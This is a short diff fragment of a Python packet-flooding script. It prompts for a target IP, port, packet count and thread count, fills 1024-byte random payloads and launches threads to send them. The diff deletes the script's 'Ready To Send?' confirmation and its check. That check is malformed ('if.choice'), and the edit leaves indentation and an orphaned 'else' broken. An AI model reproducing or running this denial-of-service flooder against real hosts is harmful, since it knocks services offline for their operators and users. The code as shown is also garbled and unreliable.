@@ -38,7 +38,6 @@ ip = str(input("===> IP TARGET : "))
 port = int(input("===> PORT TARGET : "))
 times = int(input("===> PACKETS : "))
 threads = int(input("===> THREADS : "))
-choice = str(input("===> Ready To Send? (y/n)     : ")) 
 
 def wibu():
 	data = random._urandom(1024)
@@ -68,7 +67,6 @@ def wibu2():
 
 # Threads
 for y in range(threads):
-	if.choice == 'y':
 	th = threading.Thread(target = wibu)
 	th.start()
 else:
